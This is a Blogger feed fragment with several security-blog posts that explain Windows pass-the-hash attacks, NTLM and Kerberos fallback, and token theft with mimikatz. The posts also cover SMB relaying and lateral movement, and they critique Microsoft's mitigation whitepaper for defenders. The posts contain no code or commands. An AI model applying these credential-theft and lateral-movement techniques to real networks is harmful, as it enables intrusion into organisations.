href='http://www.blogger.com/feeds/5968836134591949637/posts/default/5994175761750389635'/><link rel='alternate' type='text/html' href='http://passing-the-hash.blogspot.com/2013/01/microsofts-three-pth-mitigations.html' title='Microsoft&#39;s Three PTH Mitigations'/><author><name>Exorcyst</name><uri>http://www.blogger.com/profile/04354783607463944232</uri><email>noreply@blogger.com</email><gd:image rel='http://schemas.google.com/g/2005#thumbnail' width='16' height='16' src='https://img1.blogblog.com/img/b16-rounded.gif'/></author><thr:total>3</thr:total><georss:featurename>United States</georss:featurename><georss:point>38.805470223177466 -77.0361328125</georss:point><georss:box>37.217823723177467 -79.6179198125 40.393116723177464 -74.4543458125</georss:box></entry><entry><id>tag:blogger.com,1999:blog-5968836134591949637.post-2478758086957723418</id><published>2013-01-02T21:09:00.000-08:00</published><updated>2013-01-02T21:09:19.500-08:00</updated><title type='text'>Microsoft&#39;s Prototypical PTH Attack Scenario </title><content type='html'>&lt;br /&gt;I think before we get too far along I&#39;d like to quickly discuss the major flaw in the scenario that MS uses in their &quot;&lt;a href=&quot;http://download.microsoft.com/download/7/7/A/77ABC5BD-8320-41AF-863C-6ECFB10CB4B9/Mitigating%20Pass-the-Hash%20(PtH)%20Attacks%20and%20Other%20Credential%20Theft%20Techniques_English.pdf&quot; target=&quot;_blank&quot;&gt;PTH Mitigation&lt;/a&gt;&quot; whitepaper.&lt;br /&gt;&lt;br /&gt;I&#39;m going to start by outlining what MS considers to be a typical attack (p6 - 12).&lt;br /&gt;&lt;br /&gt;&lt;ol&gt;&lt;li&gt;Attacker gains access to a workstation at the &quot;system&quot; level&lt;/li&gt;&lt;li&gt;Attacker attempts to gather hashes from SAM/local access tokens&amp;nbsp;&lt;/li&gt;&lt;li&gt;Attacker uses PTH to gain access to resources, searches for more tokens&lt;/li&gt;&lt;li&gt;Attacker eventually takes the Domain Controller (DC)&lt;/li&gt;&lt;li&gt;Game Over.&lt;/li&gt;&lt;/ol&gt;&lt;div&gt;To quote the treatise (p. 8) &amp;nbsp;&quot;1. An attacker obtains local administrative access to a computer on the network by enticing a victim into executing malicious code, by exploiting a known or unpatched vulnerability, or through other means.&quot;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;This seems to be a popular idea of how an attack goes. &amp;nbsp;There&#39;s one gaping hole in this idea. &amp;nbsp;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;They are actually missing a step.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;In reality, often the first 2 steps are different.&lt;br /&gt;&lt;br /&gt;&lt;ol&gt;&lt;li&gt;&lt;b&gt;Attacker gains &quot;user&quot; level access to a system (say phishing to be&amp;nbsp;realistic)&lt;/b&gt;&lt;/li&gt;&lt;li&gt;&lt;b&gt;Attacker privilege escalates to &quot;system&quot; on the workstation&lt;/b&gt;&lt;/li&gt;&lt;li&gt;Attacker attempts to gather hashes from SAM/local access tokens&amp;nbsp;&lt;/li&gt;&lt;li&gt;Attacker uses PTH to gain access to resources, searches for more tokens&lt;/li&gt;&lt;li&gt;Attacker eventually takes the Domain Controller (DC)&lt;/li&gt;&lt;li&gt;Game Over.&lt;/li&gt;&lt;/ol&gt;&lt;/div&gt;&lt;div&gt;How is this significant you might ask? &amp;nbsp;Well....&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;&lt;b&gt;&lt;u&gt;More often than not, user level access is sufficient.&lt;/u&gt;&lt;/b&gt;&lt;/div&gt;&lt;div&gt;&lt;b&gt;&lt;u&gt;&lt;br /&gt;&lt;/u&gt;&lt;/b&gt;&lt;/div&gt;&lt;div&gt;Inside an organization, who has access to file shares? &amp;nbsp;The intranet sites/apps? &amp;nbsp;The email? &amp;nbsp;The internal databases? &amp;nbsp;The users. &amp;nbsp;While &quot;privileged accounts&quot; such as domain admin or other privilege accounts might have more access, chances are all the users in the &quot;finance dept&quot; group have access to all the files on the &quot;finance&quot; file share. &amp;nbsp;There&#39;s a good chance the folks in &quot;sales&quot; all have access to both the files in &quot;sales&quot; and the CRM app. &amp;nbsp;Admins probably don&#39;t have direct access to the CRM app...&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;So, if an attacker is interested in stealing financial information for a company and they have access to the finance department&#39;s file share, do they really need any more access? &amp;nbsp;Better yet, they probably have access to the &quot;sales&quot; and the &quot;research&quot; file shares as well because of poor access control on the file server. &amp;nbsp;So at this point if an attacker can gain all the information they need without raising the threat level of the defense why should they? &amp;nbsp;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;What sorts of things can a &quot;user level&quot; account do? &amp;nbsp;They can query the domain for pretty much all the information contained, such as machine names, user names, groups, group membership, etc. &amp;nbsp;What can be done with all of that info? &amp;nbsp;If an attacker had a list of all the user names, they could launch a password-guessing attack against everybody in the domain. &amp;nbsp;Or, perhaps they could send a phishing email to everybody in the &quot;sales&quot; group trying to gain more access. &amp;nbsp;At that point it&#39;s really a &quot;choose your own adventure&quot; type of setup.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;This is the flaw in the threat model presented. &amp;nbsp;An attacker can usually get at most, if not all, of the critical data of an&amp;nbsp;organization&amp;nbsp;by compromising user accounts. &amp;nbsp;Remember folks, this is the real world, not &lt;a href=&quot;http://www.nationalccdc.org/&quot; target=&quot;_blank&quot;&gt;CCDC&lt;/a&gt;.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;br /&gt;</content><link rel='replies' type='application/atom+xml' href='http://passing-the-hash.blogspot.com/feeds/2478758086957723418/comments/default' title='Post Comments'/><link rel='replies' type='text/html' href='http://passing-the-hash.blogspot.com/2013/01/microsofts-prototypical-pth-attack.html#comment-form' title='0 Comments'/><link rel='edit' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/2478758086957723418'/><link rel='self' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/2478758086957723418'/><link rel='alternate' type='text/html' href='http://passing-the-hash.blogspot.com/2013/01/microsofts-prototypical-pth-attack.html' title='Microsoft&#39;s Prototypical PTH Attack Scenario '/><author><name>Exorcyst</name><uri>http://www.blogger.com/profile/04354783607463944232</uri><email>noreply@blogger.com</email><gd:image rel='http://schemas.google.com/g/2005#thumbnail' width='16' height='16' src='https://img1.blogblog.com/img/b16-rounded.gif'/></author><thr:total>0</thr:total></entry><entry><id>tag:blogger.com,1999:blog-5968836134591949637.post-8441527358912125478</id><published>2012-12-27T22:36:00.001-08:00</published><updated>2012-12-28T07:07:49.842-08:00</updated><title type='text'>WTH is PTH</title><content type='html'>&lt;div dir=&quot;ltr&quot;&gt;Since Microsoft did a number to confuse the issue of &quot;Pass the hash&quot; attacks in their &lt;a href=&quot;http://blogs.technet.com/b/trustworthycomputing/archive/2012/12/11/mitigating-targeted-attacks-on-your-organization.aspx&quot; target=&quot;_blank&quot;&gt;whitepaper&lt;/a&gt;, I think it&#39;s time for a brief refresher on what exactly a &quot;Pass the hash&quot; attack is.&lt;/div&gt;&lt;div dir=&quot;ltr&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div dir=&quot;ltr&quot;&gt;So, please bear with me whilst I go over a few definitions. &amp;nbsp;I&#39;m going to gloss over some of the details and elaborate where I feel I must. &amp;nbsp;I include a link to wikipedia with tons more info...&lt;/div&gt;&lt;div dir=&quot;ltr&quot;&gt;&lt;b&gt;&lt;br /&gt;&lt;/b&gt;&lt;/div&gt;&lt;div dir=&quot;ltr&quot;&gt;&lt;b&gt;Cryptographic Hash &amp;nbsp;Function&lt;/b&gt; &lt;a href=&quot;http://en.wikipedia.org/wiki/Cryptographic_hash_function&quot;&gt;(from Wikipedia)&lt;/a&gt;- &amp;nbsp;&quot;...&amp;nbsp;an algorithm that takes an arbitrary block of data and returns a fixed-size bit string, the (cryptographic) hash value, such that an (accidental or intentional) change to the data will (with very high probability) change the hash value&quot;&lt;/div&gt;&lt;div dir=&quot;ltr&quot;&gt;In small words, this means that you take a block of text (for example, a password) and run it through some magic function, and if you made a small change to the password, you would end up with a completely different value. &amp;nbsp;Passwords are often stored using a hash function to make them more difficult to crack prevent the password from being stored in plain text.&lt;/div&gt;&lt;div dir=&quot;ltr&quot;&gt;&lt;b&gt;&lt;br /&gt;&lt;/b&gt;&lt;/div&gt;&lt;div dir=&quot;ltr&quot;&gt;&lt;b&gt;NTLM&lt;/b&gt;&lt;b&gt; &lt;/b&gt;&lt;a href=&quot;http://en.wikipedia.org/wiki/NTLM&quot;&gt;(from &lt;/a&gt;&lt;a href=&quot;http://en.wikipedia.org/wiki/NTLM&quot;&gt;wikipedia&lt;/a&gt;&lt;a href=&quot;http://en.wikipedia.org/wiki/NTLM&quot;&gt;)&lt;/a&gt;&amp;nbsp;- &quot;...&amp;nbsp;a suite of Microsoft security protocols that provides authentication, integrity, and confidentiality to users&quot;. &amp;nbsp;For implementation details, read the page on NTLM from the &lt;a href=&quot;http://davenport.sourceforge.net/ntlm.html&quot; target=&quot;_blank&quot;&gt;Davenport Project.&lt;/a&gt;&lt;/div&gt;&lt;div dir=&quot;ltr&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div dir=&quot;ltr&quot;&gt;&lt;b&gt;NT hash&lt;/b&gt; - the 16 byte result of the Unicode password sent through the MD4 hash&amp;nbsp; function&lt;/div&gt;&lt;div dir=&quot;ltr&quot;&gt;&lt;b&gt;LM hash&lt;/b&gt; - old (NT old) hash read about it on &lt;a href=&quot;http://en.wikipedia.org/wiki/LM_hash&quot; target=&quot;_blank&quot;&gt;Wikipedia&lt;/a&gt;&lt;/div&gt;&lt;div dir=&quot;ltr&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div dir=&quot;ltr&quot;&gt;&lt;b&gt;Kerberos&lt;/b&gt; - Microsoft&#39;s default authentication mechanism&amp;nbsp; for Active Directory (originally from MIT). (&lt;a href=&quot;http://en.wikipedia.org/wiki/Kerberos_%28protocol%29&quot; target=&quot;_blank&quot;&gt;Wikipedia&lt;/a&gt;)&lt;/div&gt;&lt;div dir=&quot;ltr&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;h2&gt;&lt;b&gt;Now that you have some background...&lt;/b&gt;&lt;/h2&gt;&lt;div dir=&quot;ltr&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div dir=&quot;ltr&quot;&gt;A &quot;pass the hash&quot; (PTH) attack can happen when just the password hash is sufficient to authenticate a user to a system.&amp;nbsp; NTLM is a good example.&amp;nbsp; For both NTLM version 1 and version 2, the password for the user requesting services is hashed and then that hash is used for the rest of the challenge-response based authentication process. &amp;nbsp; Note other platforms have suffered from a PTH attack (e.g.&amp;nbsp;&lt;a href=&quot;http://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/&quot; target=&quot;_blank&quot;&gt;coldfusion&lt;/a&gt;) so Microsoft doesn&#39;t own the patent on this class of vulnerability.&lt;/div&gt;&lt;div dir=&quot;ltr&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;table align=&quot;center&quot; cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; class=&quot;tr-caption-container&quot; style=&quot;margin-left: auto; margin-right: auto; text-align: center;&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;http://2.bp.blogspot.com/-AxIAVSarze8/UN03RvtBrVI/AAAAAAAAADA/ZPuNwxs4Jfg/s1600/Auth+_+NTLM+Auth-norm.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: auto; margin-right: auto;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;172&quot; src=&quot;http://2.bp.blogspot.com/-AxIAVSarze8/UN03RvtBrVI/AAAAAAAAADA/ZPuNwxs4Jfg/s320/Auth+_+NTLM+Auth-norm.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;tr-caption&quot; style=&quot;text-align: center;&quot;&gt;What normal authentication looks like&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;table align=&quot;center&quot; cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; class=&quot;tr-caption-container&quot; style=&quot;margin-left: auto; margin-right: auto; text-align: center;&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;http://4.bp.blogspot.com/-6rTLtIns9Xo/UN03vw86uMI/AAAAAAAAADM/cSPmevNiP00/s1600/Auth+_+NTLM+Auth-hash.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: auto; margin-right: auto;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;148&quot; src=&quot;http://4.bp.blogspot.com/-6rTLtIns9Xo/UN03vw86uMI/AAAAAAAAADM/cSPmevNiP00/s320/Auth+_+NTLM+Auth-hash.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;tr-caption&quot; style=&quot;text-align: center;&quot;&gt;Hash only authentication&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div dir=&quot;ltr&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div dir=&quot;ltr&quot;&gt;So, what does this mean? &amp;nbsp;In essence, if an attacker has password hashes (multiple ways of obtaining hashes, more than likely another blog entry... ) and access to a service which allows NTLM to authenticate, the attacker can authenticate using a username and a hash with a modified client. &amp;nbsp;&lt;/div&gt;&lt;div dir=&quot;ltr&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div dir=&quot;ltr&quot;&gt;What services can use NTLM to authenticate? &amp;nbsp;Well, IIS, Exchange (to include SMTP, POP3, IMAP), file and print services, MSSQL, and many other services related to gathering information from an Active Directory environment can use NTLM to authenticate. &amp;nbsp;There are even a couple of ways to obtain code execution using PTH with either winexe (psexec clone) or WMIC, depending on how you&#39;re feeling. &amp;nbsp;There are modified clients to do all of this from Linux and there are even ways to coax a Windows client to do it. &amp;nbsp;For more info, please see the rest of the blog entries, our &lt;a href=&quot;https://media.blackhat.com/bh-us-12/Briefings/Duckwall/BH_US_12_Duckwall_Campbell_Still_Passing_Slides.pdf&quot; target=&quot;_blank&quot;&gt;Blackhat 2012 talk&lt;/a&gt;, or the demo &lt;a href=&quot;http://passing-the-hash.blogspot.com/2012/08/demo-vids-online.html&quot; target=&quot;_blank&quot;&gt;vids&lt;/a&gt; ;-)&lt;/div&gt;&lt;div dir=&quot;ltr&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div dir=&quot;ltr&quot;&gt;But, you may say, &quot;We use Kerberos, your puny PTH won&#39;t work against us!&quot;. You would be incorrect.&amp;nbsp;In order for Kerberos to work properly, several conditions need to be met. &amp;nbsp;Among the big ones 1) both ends of the connection need to be in the same Active Directory domain (or trusted) and 2) each end of the connection needs to refer to the other side by DNS name. &amp;nbsp;There are more conditions (read the NTLM wiki link above for all the conditions of when NTLM is used instead of Kerberos)&lt;/div&gt;&lt;div dir=&quot;ltr&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div dir=&quot;ltr&quot;&gt;If Kerberos cannot be used, by default NTLM is used as the fail over. &amp;nbsp;Uh oh....&lt;/div&gt;&lt;div dir=&quot;ltr&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;h2&gt;WAIT! I thought PTH meant....&lt;/h2&gt;&lt;div&gt;The MS whitepaper confuses the meaning of PTH with a couple of different attacks than what I described earlier.&amp;nbsp;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;One attack that MS calls &quot;PTH&quot; is using a local account hash from a computer to privilege escalate on that computer or move laterally to other machines. &amp;nbsp;So, let&#39;s decipher this a little bit. &amp;nbsp;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;When a new Windows computer is stood up it is built with an account that has administrative privileges. &amp;nbsp;Then, at some point, the computer has to be added to the domain. &amp;nbsp;So what happens to the admin account on that machine after it gets added to the domain?&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;On older Windows systems (XP/2003) the local administrator account&amp;nbsp;(also sometimes known as the 500 account) is created when the computer is stood up. &amp;nbsp;This account is used for administrative tasks, such as backups, patching, installing software, etc... &amp;nbsp;The hashes for this account are stored locally in the SAM database. &amp;nbsp;When the computer is added to a domain, this account remains and is still available for network logins. &amp;nbsp;Since admins are often lazy, many of these built-in admin accounts share the same password across multiple machines. &amp;nbsp;If one of these machines is compromised, and the local hashes are dumped out of the SAM, an attacker has now gained administrative access to potentially more machines on the network. &amp;nbsp;While &amp;nbsp;the attacker doesn&#39;t have privileged domain credentials, the local &quot;system&quot; account on these machines has access to the computer account for the domain. &amp;nbsp;This is sufficient to query the AD for more information, such as a list of users or groups. &amp;nbsp;This extra info leads to further attacks later.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;Newer versions of Windows (2008/Vista / 7 ) by default disable the built-in administrator account &amp;nbsp;and instead creates an account that is in the &quot;Administrators&quot; group local to the machine. &amp;nbsp;This account can also be used to administer the workstation and its information is also stored in the SAM. &amp;nbsp;When the computer is added to the domain, &lt;u&gt;by default (assuming UAC is enabled)&lt;/u&gt; these accounts are NOT accessible from the network. &amp;nbsp; So while the hashes provided could be cracked or recycled for other accounts, this information isn&#39;t as useful as it would be on older versions of Windows. &amp;nbsp;However, it is worth noting that this behavior can be&amp;nbsp;overridden&amp;nbsp;by registry settings or GPO settings, so beware.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;The MS whitepaper calls using these accounts a PTH attack. Meh. &amp;nbsp;I sorta see what they are going for, but aside from hashes being involved, this isn&#39;t really a separate attack vector... &amp;nbsp; More like an&amp;nbsp;availability of hashes sort of issue...&amp;nbsp;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;h2&gt;&lt;b&gt;Tokens!&lt;/b&gt;&lt;/h2&gt;&lt;div&gt;In either case, if an attacker could get to a point where they can dump the local hashes, then more than likely they&#39;d be more interested in whatever security tokens are&amp;nbsp;available. Tokens will be addressed in a later blog post about Windows authentication, however the gist is that a token gets created when a user logs in. &amp;nbsp;The token also contains the user&#39;s login name, the user hashes (NT / LM) and &amp;nbsp;the domain (if applicable) the user is authenticated to. &amp;nbsp;To keep things interesting, tokens often persist in memory for a long time, even after a user has disconnected from the computer. &amp;nbsp;If that wasn&#39;t enough, in many cases the &lt;u style=&quot;font-weight: bold;&quot;&gt;plain text password &lt;/u&gt;(&lt;a href=&quot;http://blog.gentilkiwi.com/mimikatz&quot; target=&quot;_blank&quot;&gt;mimikatz&lt;/a&gt;)&amp;nbsp;can be recovered as well. &amp;nbsp;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;If that doesn&#39;t give you nightmares nothing else will... of course if I have a plain text password is it really a PTH attack now? &amp;nbsp;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;h2&gt;&lt;b&gt;Not to be confused with...&lt;/b&gt;&lt;/h2&gt;&lt;div dir=&quot;ltr&quot;&gt;Another form of attack which is often confused with PTH is called SMB relaying. &amp;nbsp;Although, this is even a bit of a misnomer. &amp;nbsp;This attack deals with hashes, but not with the NT or LM hashes used by the traditional PTH tool suite. &amp;nbsp;The hashes involved are the response hashes to the challenge issued by a server when attempting to authenticate using one of the versions of NTLM. &amp;nbsp;&lt;/div&gt;&lt;div dir=&quot;ltr&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div dir=&quot;ltr&quot;&gt;Because of a poor design in the NTLM protocols, if I can get an authenticated person to attempt to use NTLM authentication against a computer I control (say, via a web page requesting NTLM authentication) I can act as a Man-in-the-Middle for any other service using NTLM, such as file shares. &amp;nbsp;If I initiate a connection to the file server, I can feed the challenge I get from the file server back to the web page as my challenge and use the results to authenticate against the file server. &amp;nbsp;Essentially I&#39;m using an already authenticated connection to authenticate to a different service. &amp;nbsp;So, without knowledge of the password, I am able to access additional services by &quot;passing the hash&quot;.&lt;/div&gt;&lt;div dir=&quot;ltr&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div dir=&quot;ltr&quot;&gt;There has been a lot of semi-recent conversations about SMB Relaying. &amp;nbsp;A couple of links:&lt;/div&gt;&lt;div dir=&quot;ltr&quot;&gt;&lt;a href=&quot;http://www.room362.com/blog/2012/7/10/cross-protocol-chained-pass-the-hash-for-metasploit.html&quot; target=&quot;_blank&quot;&gt;Cross-Protocol Chained PTH for Metasploit&lt;/a&gt;&lt;/div&gt;&lt;div dir=&quot;ltr&quot;&gt;&lt;a href=&quot;https://media.defcon.org/dc-20/presentations/Fasel/DEFCON-20-Fasel-Owned-in-60-Seconds.pdf&quot; target=&quot;_blank&quot;&gt;Owned in 60 Seconds: From Network Guest to Windows Domain Admin&lt;/a&gt;&lt;/div&gt;&lt;h2&gt;&lt;/h2&gt;&lt;h2&gt;In Summary...&lt;/h2&gt;&lt;div dir=&quot;ltr&quot;&gt;I&#39;ve tried to lay out the foundation to understanding what a PTH attack is. &amp;nbsp;I&#39;ve also tried to explain what MS is calling a PTH attack and what other folks are calling PTH attacks. &amp;nbsp;Next post will be all about Windows authentication.... &amp;nbsp;Questions? Comments? Feel I need clarification? &amp;nbsp;Hit me up on twitter or post comments to the blog and I&#39;ll try to answer as best I can...&lt;/div&gt;&lt;div dir=&quot;ltr&quot;&gt;&lt;br /&gt;&lt;/div&gt;</content><link rel='replies' type='application/atom+xml' href='http://passing-the-hash.blogspot.com/feeds/8441527358912125478/comments/default' title='Post Comments'/><link rel='replies' type='text/html' href='http://passing-the-hash.blogspot.com/2012/12/wth-is-pth.html#comment-form' title='2 Comments'/><link rel='edit' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/8441527358912125478'/><link rel='self' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/8441527358912125478'/><link rel='alternate' type='text/html' href='http://passing-the-hash.blogspot.com/2012/12/wth-is-pth.html' title='WTH is PTH'/><author><name>Exorcyst</name><uri>http://www.blogger.com/profile/04354783607463944232</uri><email>noreply@blogger.com</email><gd:image rel='http://schemas.google.com/g/2005#thumbnail' width='16' height='16' src='https://img1.blogblog.com/img/b16-rounded.gif'/></author><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://2.bp.blogspot.com/-AxIAVSarze8/UN03RvtBrVI/AAAAAAAAADA/ZPuNwxs4Jfg/s72-c/Auth+_+NTLM+Auth-norm.png" height="72" width="72"/><thr:total>2</thr:total></entry><entry><id>tag:blogger.com,1999:blog-5968836134591949637.post-6594184210909818182</id><published>2012-12-16T22:28:00.000-08:00</published><updated>2012-12-17T14:56:04.572-08:00</updated><title type='text'>And we&#39;re back...</title><content type='html'>Sorry folks for the delay in getting the blog updated.&amp;nbsp; I&#39;d meant to get back to the blog sooner, but I was on the road for a month, then I was trying to finish stuff up at work, then $excuse[0] and then $excuse[1]&amp;nbsp; and then $excuse[$i++] ...&lt;br /&gt;&lt;br /&gt;So, what shook me out of my stupor?&lt;br /&gt;&lt;br /&gt;&lt;a href=&quot;http://blogs.technet.com/b/trustworthycomputing/archive/2012/12/11/mitigating-targeted-attacks-on-your-organization.aspx&quot; target=&quot;_blank&quot;&gt;This&lt;/a&gt; article and the associated PDF from Microsoft talking about Pass-the-Hash.&lt;br /&gt;&lt;br /&gt;&amp;nbsp;My initial response after reading the blog post and the associated 81 page PDF?&lt;br /&gt;&lt;br /&gt;&quot;WTFITS?&quot;&lt;br /&gt;&lt;br /&gt;Chris (@obscuresec), my speaking partner at BHUSA 2012 and Derbycon 2.0, had a similar response...&lt;br /&gt;&lt;br /&gt;Then Richard Bejtlich (@taosecurity) asked for comments on Twitter about the paper... that sorta opened up the floodgate for both me and Chris.&amp;nbsp; Long story short, I was asked to put some of my thoughts on the subject down, so here we go...&lt;br /&gt;&lt;br /&gt;I&#39;ve spent a couple days now re-reading the whitepaper.&amp;nbsp; I&#39;ve read for detail and am trying to make sure I&#39;m completely understanding what they are saying and where they&#39;re going.&amp;nbsp; I&#39;m also trying (sometimes harder than others) to deliver a calm, rational response to the items in the whitepaper.&lt;br /&gt;&lt;br /&gt;We&#39;ll see how that goes...&lt;br /&gt;&lt;br /&gt;So, I&#39;m going to have several blog entries about the whitepaper.&amp;nbsp; I&#39;m not quite sure how it&#39;s all going to be split up at this point, but I am going to start with a few overall observations and then we will see.&lt;br /&gt;&lt;br /&gt;I&#39;m going to start with a quick aside, as I want to make sure we are all on the same sheet of music when it comes to terminology.&amp;nbsp; Please bear with me.&lt;br /&gt;&lt;br /&gt;&lt;b&gt;Definition :&lt;/b&gt;&lt;br /&gt;&amp;nbsp; Mitigation - The action of reducing the severity, seriousness, or painfulness of something&lt;br /&gt;Synonyms : cure, alleviate &lt;br /&gt;&amp;nbsp; &lt;br /&gt;So, I would expect a &quot;&lt;u&gt;PTH Mitigation&lt;/u&gt;&quot; to lessen the impact of PTH attacks.&amp;nbsp; Makes sense, eh?&lt;br /&gt;&lt;b&gt;&lt;br /&gt;&lt;/b&gt;&lt;b&gt;Ok, what&#39;s PTH (Pass-the-Hash)?&lt;/b&gt;&lt;br /&gt;&lt;br /&gt;Short version: Microsoft treats the password hash as being equivalent to a password with NTLM.&amp;nbsp; This means that you don&#39;t need the plaintext password to log into a service.&amp;nbsp; With a modified client, you can simply substitute the hashed password and it will still work.&lt;br /&gt;&lt;br /&gt;Longer version: For our BHUSA 2012 talk, Chris and I wrote a whitepaper.&amp;nbsp; You can read &lt;a href=&quot;https://media.blackhat.com/bh-us-12/Briefings/Duckwall/BH_US_12_Duckwall_Campbell_Still_Passing_WP.pdf&quot; target=&quot;_blank&quot;&gt;it here&lt;/a&gt;.&lt;br /&gt;&lt;br /&gt;&lt;b&gt;What PTH attacks are talked about in the MS whitepaper?&lt;/b&gt;&lt;br /&gt;&lt;br /&gt;Microsoft in their whitepaper lists 2 specific examples of PTH attack:&lt;br /&gt;.&lt;br /&gt;1) Using password hashes to move laterally from computer to computer.&amp;nbsp; In this case the computers are of the same &quot;value&quot;.&amp;nbsp; This means that an attacker is moving from workstation to workstation instead of workstation to server.&lt;br /&gt;&lt;br /&gt;2) Using password hashes to &quot;privilege escalate&quot;, or to move from a lower valued computer to a higher valued computer.&amp;nbsp; For example, moving from a workstation to a web server.&lt;br /&gt;&lt;br /&gt;All of Microsoft&#39;s &quot;mitigations&quot; are meant to defend one or both of these &quot;attacks&quot;&lt;br /&gt;&lt;br /&gt;&lt;b&gt;Quick Observations&lt;/b&gt;&lt;br /&gt;&lt;ul&gt;&lt;li&gt;It&#39;s obvious (aside from 2 pages of writing credits) that this paper was written by many different hands.&amp;nbsp; This becomes even more obvious when parts of the whitepaper contradict itself.&amp;nbsp; I don&#39;t envy the job of the person who was supposed to cull everything together into some sort of semi-coherent beast.&lt;/li&gt;&lt;li&gt;The paper tries to do too much.&amp;nbsp; It tries to be all things to all people.&amp;nbsp; I realize that MS has been under pressure to deliver some sort of response to the 15 year old PTH problem, but releasing a long, confusing whitepaper really doesn&#39;t solve anything and could possibly compound the issue by being easy to misread or misunderstand. God help us when people implement the &quot;mitigations&quot; and are still attacked with PTH.&amp;nbsp; Microsoft better be ready for the pitchforks and torches...&lt;/li&gt;&lt;li&gt;This is a complex subject.&amp;nbsp; Windows authentication is a quagmire of backwards compatibility built on hacked solutions to hard problems (like SSO, single sign on).&amp;nbsp; You can&#39;t have a frank and complete conversation about Windows auth without talking about ALL of Windows auth, and the paper doesn&#39;t cover everything.&lt;/li&gt;&lt;li&gt;Pro Tip: You probably shouldn&#39;t have a &quot;recommendation&quot; for a mitigation that says &quot;don&#39;t do this mitigation, instead do something else&quot; (Read mitigation 2, p14.)&lt;/li&gt;&lt;li&gt;There are a lot of useful nuggets in the whitepaper.&amp;nbsp; However, they&#39;re either buried or poorly worded&amp;nbsp; &lt;/li&gt;&lt;li&gt;Many of the mitigations seem redundant and could be summarized as &quot;Don&#39;t be stupid&quot;&lt;/li&gt;&lt;li&gt;The tone of the whitepaper is a weird combination of spin control, defeatism, and over-generalizations.&lt;/li&gt;&lt;/ul&gt;And Finally....&lt;br /&gt;&lt;br /&gt;&lt;h3&gt;&lt;u&gt;&lt;b&gt;If somebody is already in your network and has your hashes none of the mitigations in the whitepaper will have any positive effect.&amp;nbsp; None of the mitigations will give the attacker any pause, make life difficult, pester or bother them in any way.&lt;/b&gt;&lt;/u&gt;&lt;/h3&gt;&lt;h3&gt;&amp;nbsp;&lt;/h3&gt;&lt;h3&gt;I&#39;m sorry, don&#39;t shoot the non-Microsoft messenger... &lt;/h3&gt;&lt;h3&gt;&amp;nbsp;&lt;/h3&gt;&lt;h3&gt;The only glimmer of hope is that some of these mitigations might make it more difficult for an attacker to obtain administrative hashes if they don&#39;t already have them.&amp;nbsp; However, it&#39;s usually just a matter of time.&lt;/h3&gt;&lt;div&gt;&lt;br 